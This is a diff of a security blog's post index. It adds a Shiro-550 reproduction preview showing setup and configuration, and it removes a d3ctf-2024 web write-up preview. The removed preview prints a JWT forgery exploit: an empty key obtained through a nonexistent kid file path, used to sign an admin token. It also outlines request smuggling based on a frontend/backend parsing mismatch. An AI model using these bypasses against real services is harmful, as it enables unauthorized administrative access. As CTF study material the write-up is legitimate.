@@ -157,6 +157,23 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">Shiro-550漏洞复现
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。
+基础知识 组件 Shiro有三大核心组件，即Subject、SecurityManager 和 Realm
+Subject: 认证主体。Subject代表了当前的用户。包含Principals和Credentials两个信息。 SecurityManager：安全管理员。是Shiro架构的核心。与Subject的所有交互都会委托给SecurityManager，它负责与Shiro 的其他组件进行交互。 Realm：域。Shiro从Realm中获取安全数据（如用户、角色、权限），就是说SecurityManager要验证用户身份，那么它需要从Realm中获取相应的用户进行比较，来确定用户的身份是否合法 一些概念：
+Authentication: 身份认证、登录，验证用户是不是拥有相应的身份; Authorization：鉴权，验证某个已认证的用户是否拥有某个权限 Session Manager: 会话管理 Cryptography: 加密,保护数据的安全性 Concurrency: Shiro支持多线程应用的并发验证，即，如在一个线程中开启另一个线程,能把权限自动的传播过去 Remember Me：会话保存 配置 web.xml，shiro通过filter进行注入。
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;web-app xmlns=&#34;http://java.sun.com/xml/ns/javaee&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xsi:schemaLocation=&#34;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&#34; version=&#34;2.5&#34;&gt; &lt;listener&gt; &lt;listener-class&gt;org.apache.shiro.web.env.EnvironmentLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;filter&gt; &lt;filter-name&gt;ShiroFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.shiro.web.servlet.ShiroFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;ShiroFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt; &lt;/web-app&gt; shiro.ini用于配置具体权限
+[main] shiro.loginUrl = /login.jsp [users] # format: username = password, role1, role2, ..., roleN root = secret,admin guest = guest,guest presidentskroob = 12345,president darkhelmet = ludicrousspeed,darklord,schwartz lonestarr = vespa,goodguy,schwartz [roles] # format: roleName = permission1, permission2, ....</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-03-26 10:48:20 +0000 UTC'>March 26, 2025</span>&nbsp;·&nbsp;6 min</footer>
+  <a class="entry-link" aria-label="post link to Shiro-550漏洞复现" href="https://zoiltin.github.io/posts/shiro-550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">CTF记录-NCTF_2024, 红明谷CTF_2025
     </h2>
   </header>
@@ -327,21 +344,6 @@ public Object evaluate(Context ctx) { Class targetCls = null; Object targetObj =
   </div>
   <footer class="entry-footer"><span title='2024-07-27 18:21:03 +0800 CST'>July 27, 2024</span>&nbsp;·&nbsp;3 min</footer>
   <a class="entry-link" aria-label="post link to Ciscn 2024 final Fobee wp" href="https://zoiltin.github.io/posts/ciscn2024-final-fobee-wp/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">d3ctf-2024-web-wp
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>d3pythonhttp 解决，一血
-jwt绕过 def get_key(kid): key = &#34;&#34; dir = &#34;/app/&#34; try: with open(dir&#43;kid, &#34;r&#34;) as f: key = f.read() except: pass print(key) return key def verify_token(token): header = jwt.get_unverified_header(token) kid = header[&#34;kid&#34;] key = get_key(kid) try: payload = jwt.decode(token, key, algorithms=[&#34;HS256&#34;]) return True except: return False 验证jwt时kid控制密钥文件路径，如果设置的密钥文件不存在，则key为空，所以构造空秘钥以及一个不存在的文件即可：
-print(jwt.encode({&#34;username&#34;:&#34;admin&#34;,&#34;isadmin&#34;:true}, key, algorithm=&#34;HS256&#34;, headers={&#34;kid&#34;: &#34;frontend_keyasdasd&#34;})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M 解析差异 一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。 经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。
-headers = {key: value for (key, value) in request.headers if key != &#39;Host&#39;} 除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。 数据包：...</p>
-  </div>
-  <footer class="entry-footer"><span title='2024-04-28 20:35:50 +0000 UTC'>April 28, 2024</span>&nbsp;·&nbsp;6 min</footer>
-  <a class="entry-link" aria-label="post link to d3ctf-2024-web-wp" href="https://zoiltin.github.io/posts/d3ctf-2024-web-wp/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
